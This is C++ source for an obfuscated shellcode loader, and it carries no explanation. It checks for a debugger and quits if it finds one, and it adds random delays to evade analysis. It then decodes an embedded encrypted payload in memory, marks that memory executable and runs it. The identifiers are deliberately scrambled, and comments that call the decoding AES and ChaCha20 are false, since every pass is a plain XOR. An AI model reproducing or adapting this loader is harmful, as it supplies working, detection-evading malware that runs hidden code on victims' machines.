#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

bool instUtildpUCig559() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

int main() {
    // Random performance delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delay_dist(1, 999);
        int delay_ms = delay_dist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    // Anti-debug
    if (instUtildpUCig559()) return 0;

    // Payload data
    unsigned char sysBasewAquiB661[] = {
        0xdd, 0x42, 0x12, 0x67, 0xc7, 0xbe, 0x2f, 0x52, 0xe4, 0xf6, 0x4a, 0xc4, 0x52, 0x03, 0x49, 0x51, 
        0xef, 0xf6, 0x3c, 0x86, 0x6d, 0x30, 0x64, 0x84, 0x0b, 0x22, 0x63, 0xaf, 0xce, 0xf6, 0x7b, 0xde, 
        0x67, 0x1c, 0xf2, 0xd9, 0xaf
    };

    // Decryption keys
    unsigned char procHelperHoachEfkM650[] = {
        0xa8, 0xca, 0x2d, 0x10, 0xe2, 0xa2, 0x8b, 0xdc, 0x61, 0x0a, 0x4d, 0x62, 0x35, 0xcf, 0x5c, 0x83, 
        0x16
    };
    unsigned char execServiceKgdYGOJfmRu852[] = {
        0x27, 0xf2, 0x57, 0x7a, 0xfb, 0x39, 0x74, 0x9c, 0xb3, 0x0c, 0x57, 0x6d, 0xd0, 0x2a, 0x70, 0xeb
    };
    unsigned char runModuleuiBmVKmJm598[] = {
        0xa9, 0xe4, 0x25, 0xce, 0x3b, 0x81, 0x39, 0xfe, 0xe7, 0xe9, 0x5a, 0x9e, 0xda, 0x48, 0xf2, 0x73, 
        0x34, 0xc1, 0x5f, 0x44, 0x32, 0xa7, 0xe4, 0xcb, 0xcf, 0x59, 0x69, 0x81, 0x70, 0x43, 0xec, 0xa7
    };

    // Random delay before memory allocation
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> alloc_dist(1, 50);
        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));
    }

    // Allocate executable memory
    size_t execManagermjKmKuAmbWM385 = sizeof(sysBasewAquiB661);
#ifdef _WIN32
    void* instServiceNuvKhTlMxLC515 = VirtualAlloc(0, execManagermjKmKuAmbWM385, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServiceNuvKhTlMxLC515) return 1;
#else
    void* instServiceNuvKhTlMxLC515 = mmap(0, execManagermjKmKuAmbWM385, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServiceNuvKhTlMxLC515 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServiceNuvKhTlMxLC515, sysBasewAquiB661, execManagermjKmKuAmbWM385);
    unsigned char* valHandlervYPivggVHd618 = (unsigned char*)instServiceNuvKhTlMxLC515;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
        valHandlervYPivggVHd618[i] ^= procHelperHoachEfkM650[i % sizeof(procHelperHoachEfkM650)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
        valHandlervYPivggVHd618[i] ^= runModuleuiBmVKmJm598[i % sizeof(runModuleuiBmVKmJm598)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManagermjKmKuAmbWM385; i++) {
        valHandlervYPivggVHd618[i] ^= execServiceKgdYGOJfmRu852[i % sizeof(execServiceKgdYGOJfmRu852)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponenteThmlwHdkCvYF847;
    VirtualProtect(instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385, PAGE_EXECUTE_READ, &methComponenteThmlwHdkCvYF847);
    FlushInstructionCache(GetCurrentProcess(), instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385);
#else
    mprotect(instServiceNuvKhTlMxLC515, execManagermjKmKuAmbWM385, PROT_READ | PROT_EXEC);
#endif

    // Final random delay before execution
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> exec_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));
    }

    // Execute payload
    ((void(*)())instServiceNuvKhTlMxLC515)();

    return 0;
}
